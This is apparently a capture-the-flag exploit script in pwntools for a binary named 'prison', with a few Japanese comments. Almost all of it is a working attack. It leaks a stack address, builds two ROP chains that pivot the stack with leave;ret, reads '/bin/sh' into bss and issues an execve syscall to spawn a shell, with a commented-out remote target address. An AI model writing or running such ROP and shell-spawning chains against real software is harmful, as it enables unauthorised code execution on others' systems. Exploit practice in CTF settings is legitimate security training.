from pwn import *
from ctftools.pwn.common import connect

exe = ELF("prison")
# io = connect(exe, "20.84.72.194", 5001)

context.binary = exe.path
gdbscript = """
    break *main
    continue
"""

io = process(["qemu-x86_64-static", "-g", "1234", "./prison"])
# io = remote("localhost", 1234)
# pid = gdb.attach(io, "target remote :1234", exe=exe.path)
# io = gdb.debug(exe.path, gdbscript, ssh="localhost:1234")
io.interactive()

# ref. https://ctftime.org/writeup/26223

# なぜかうまくいかなかったやつ
# _dl_setup_ha"sh"
# sh = 0x400000 + 0xA23B8 + 12

# *******************************************************
# address
# *******************************************************
rop = ROP(exe)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi_pop_rbp = rop.find_gadget(["pop rsi", "pop rbp", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
syscall = rop.find_gadget(["syscall"])[0]
leave_ret = rop.find_gadget(["leave", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
bss = exe.bss()
fgets = exe.symbols.fgets
call_prison = 0x0000000000401BB8

# *******************************************************
# leak stack address (round 1)
# *******************************************************
io.sendline(b"9")
io.recvuntil(b"Your cellmate is ")
stack_leaked_address = int.from_bytes(io.recvline().strip(), "little")
start_address = stack_leaked_address - 0x50

print(hex(stack_leaked_address))
print(hex(start_address))

# *******************************************************
# ROP (round 1)
# *******************************************************
payload = flat(
    ret,
    # call fgets(bss, 0x1000, (FILE *)stdin)
    pop_rsi_pop_rbp,
    0x1000,
    start_address,
    pop_rdx,
    0x4CB500,  # stdin
    fgets,
    call_prison,
    # rbp
    start_address - 8,
    # ROP
    pop_rdi,
    bss,
    leave_ret,  # leave → payload の先頭に移る
)

io.sendline(payload)
# fgets に渡す
io.sendline(b"/bin/sh\x00")

# *******************************************************
# leak stack address (round 2)
# *******************************************************
io.sendline(b"11")
io.recvuntil(b"Your cellmate is ")
stack_leaked_address = int.from_bytes(io.recvline().strip(), "little")
start_address = stack_leaked_address - 0x10

print(hex(stack_leaked_address))
print(hex(start_address))

# *******************************************************
# ROP (round 2)
# *******************************************************
payload = flat(
    pop_rax,
    59,
    pop_rdi,
    bss,
    pop_rsi_pop_rbp,
    0,
    start_address,
    syscall,
    # rbp
    start_address - 8,
    # ROP
    pop_rdx,
    0,
    leave_ret,
)
io.sendline(payload)

io.interactive()
